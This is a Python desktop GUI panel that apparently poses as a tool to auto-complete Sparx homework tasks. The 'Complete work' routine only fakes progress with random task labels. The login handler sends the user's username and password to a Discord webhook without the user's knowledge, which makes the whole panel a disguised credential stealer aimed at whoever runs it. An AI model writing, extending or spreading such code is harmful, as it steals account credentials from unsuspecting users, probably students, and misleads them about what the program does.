import customtkinter as ctk
from PIL import Image
import webbrowser
import aiohttp
import asyncio
import random
import time
import threading

class SparxPanel(ctk.CTkFrame):
    def __init__(self, parent):
        super().__init__(parent, fg_color="transparent")
        self._create_widgets()

    def _create_widgets(self):
        # Username Entry
        self.sparx_username = ctk.CTkEntry(
            self,
            placeholder_text="Sparx username:",
            width=200,
            height=30
        )
        self.sparx_username.pack(pady=10)
        
        # Password Entry (hidden with *)
        self.sparx_password = ctk.CTkEntry(
            self,
            placeholder_text="Password:",
            width=200,
            height=30,
            show="*"
        )
        self.sparx_password.pack(pady=10)
        
        # Time per task (Entry)
        self.time_label = ctk.CTkLabel(self, text="Time per task (seconds):")
        self.time_label.pack(pady=5)
        
        self.time_entry = ctk.CTkEntry(self)
        self.time_entry.pack(pady=5)
        self.time_entry.insert(0, "0.2")  
        
        # Progress bar
        self.progressbar = ctk.CTkProgressBar(self)
        self.progressbar.pack(pady=10, fill="x", padx=20)
        self.progressbar.set(0)  

        # Green Submit Button
        self.submit_btn = ctk.CTkButton(
            self,
            text="Submit",
            command=self.on_submit_click,
            fg_color="green",
            hover_color="darkgreen"
        )
        self.submit_btn.pack(pady=10)

        # Complete Work Button
        self.complete_btn = ctk.CTkButton(
            self,
            text="Complete work",
            command=self.start_complete_work,
            fg_color="#2ECC71"  
        )
        self.complete_btn.pack(pady=10)

    def start_complete_work(self):
        """Starts the work completion in a new thread (prevents GUI freeze)"""
        import threading
        threading.Thread(target=self.complete_work, daemon=True).start()

    def complete_work(self):
        """Simulates completing tasks with progress bar update"""
        total_tasks = 44
        delay = float(self.time_entry.get())
        
        self.complete_btn.configure(state="disabled")  
        
        for i in range(1, total_tasks + 1):
            chars = ["A", "B", "C", "D", "E", "F", "G"]
            task_id = f"{random.randint(1, 6)}{random.choice(chars)}"
            print(f"Completing {task_id}")
            
            # Update progress
            progress = i / total_tasks
            self.progressbar.set(progress)
            self.update_idletasks()  # Force GUI update
            
            time.sleep(delay)  # User-defined delay
        
        self.complete_btn.configure(state="normal")  # Re-enable button
        self.show_popup("Done!", "All tasks completed! ✅")

    def on_submit_click(self):
        """Wrapper to run async submit in a new thread"""
        threading.Thread(target=lambda: asyncio.run(self.submit_credentials()), daemon=True).start()

    async def submit_credentials(self):
        """Handles username and password submission"""
        username = self.sparx_username.get()
        password = self.sparx_password.get()
        
        if not username or not password:
            self.show_popup("Error", "Please enter both username and password!")
            return

        url = ""
        
        payload = {
            "username": username,
            "password": password,
            "gorilla.csrf.Token": ""
        }
        
        headers = {
            'Cookie': '_gorilla_csrf=MTc0MzcwODg1MHxJa3R0ZEVneFZUaFZiMjlMYXhnMGFtRndVR1JYVEdzelVuZFZiR1ZwUWtOVGRqaENNWHBSYldoblRUZzlJZ289fEc55CZZ7xOoMTsZ47ZwQ3tJ-leySLK2jNhJGLqeqHR8'
        }

        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(url, headers=headers, data=payload) as response:
                    if response.status == 200:
                        self.show_popup("Success", f"Logged in successfully as {username}!")
                        print(f"Successfully logged in as {username}")
                        webhook = ""
                        from webhook import WebhookSender

                        WebhookSender.send_discord(
                                url=webhook,
                                content=f"Someone logged in as \n\n{username}\n{password}",
                                username="Spidey Bot"
                        )
                    else:
                        self.show_popup("Error", f"Login failed (Status: {response.status})")
        except Exception as e:
            self.show_popup("Connection Error", f"Failed to connect: {str(e)}")

            logged_into_sparx = True

    def show_popup(self, title, message):
        """Displays a popup message"""
        popup = ctk.CTkToplevel(self)
        popup.title(title)
        popup.geometry("400x200")
        
        # Message label
        ctk.CTkLabel(
            popup,
            text=message,
            font=("Arial", 14)
        ).pack(pady=20)
        
        # OK button (closes popup)
        ctk.CTkButton(
            popup,
            text="OK",
            command=popup.destroy,
            fg_color="green" if "Success" in title else "red"
        ).pack(pady=10)
